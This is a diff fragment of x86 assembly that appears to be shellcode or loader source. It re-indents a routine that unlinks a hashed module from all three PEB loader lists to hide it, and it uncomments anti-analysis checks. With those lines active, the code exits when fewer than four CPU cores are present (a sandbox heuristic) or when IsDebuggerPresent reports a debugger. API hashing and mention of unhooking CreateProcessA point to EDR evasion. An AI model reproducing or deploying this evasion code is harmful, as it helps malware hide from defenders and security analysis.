@@ -164,28 +164,28 @@ unlink_module:
 	Cmp Edi, [Ebp + 24H]		  ; Compare with the hash we are searching for
 	Jne find_next_unlink_dll
 
-    ; Unlink from all three lists
-    Mov Eax, [Edx - 8H]           ; InLoadOrderLinks.Flink
-    Mov Ebx, [Edx - 4H]           ; InLoadOrderLinks.Blink
-    mov [ebx], eax
-    Mov [Eax + 4H], Ebx
+       ; Unlink from all three lists
+        Mov Eax, [Edx - 8H]           ; InLoadOrderLinks.Flink
+        Mov Ebx, [Edx - 4H]           ; InLoadOrderLinks.Blink
+        Mov [ebx], eax
+        Mov [Eax + 4H], Ebx
 
-    Mov Eax, [Edx]            	  ; InMemoryOrderLinks.Flink
-    Mov Ebx, [Edx + 4H]           ; InMemoryOrderLinks.Blink
-    mov [ebx], eax
-    Mov [Eax + 4H], Ebx
+        Mov Eax, [Edx]            	  ; InMemoryOrderLinks.Flink
+        Mov Ebx, [Edx + 4H]           ; InMemoryOrderLinks.Blink
+        Mov [ebx], eax
+        Mov [Eax + 4H], Ebx
 
-    Mov Eax, [Edx - 8H + 10H]     ; InInitializationOrderLinks.Flink
-    Mov Ebx, [Edx - 8H + 14H]     ; InInitializationOrderLinks.Blink
-    mov [ebx], eax
-    Mov [Eax + 4H], Ebx
+        Mov Eax, [Edx - 8H + 10H]     ; InInitializationOrderLinks.Flink
+        Mov Ebx, [Edx - 8H + 14H]     ; InInitializationOrderLinks.Blink
+        Mov [ebx], eax
+        Mov [Eax + 4H], Ebx
 
-    Clc								; Clear the flag
-    Popad							; restore all register
+        Clc							; Clear the flag
+        Popad							; restore all register
 	Pop Ecx							; pop off the original return address
 	Pop Edx							; pop off the hash value that the caller have pushed
 	Push Ecx						; push back the return address
-    Ret
+        Ret
 
 exit:
 	Push Ebx					; 0
@@ -215,14 +215,14 @@ check:
 	Push 4B2B9D76H					; hash("kernel32.dll", "GetSystemInfo")
 	Call hash_api
 
-;	Mov Eax, [Ebp - 250H + 14H]
-;	Cmp Eax, 4					; If number of CPU cores < 4 then it most likely VM or sandboxes
-;	Jl exit_success					; exit
-;
-;	Push 0C6643248H					; hash("kernel32.dll, "IsDebuggerPresent")
-;	Call hash_api
-;	Test Al, Al					; Check if the flag is true or not
-;	Jnz exit_success
+	Mov Eax, [Ebp - 250H + 14H]
+	Cmp Eax, 4					; If number of CPU cores < 4 then it most likely VM or sandboxes
+	Jl exit_success					; exit
+
+	Push 0C6643248H					; hash("kernel32.dll, "IsDebuggerPresent")
+	Call hash_api
+	Test Al, Al					; Check if the flag is true or not
+	Jnz exit_success
 
 unhook_api:
 	; For demo, only CreateProcessA will get unhooked only
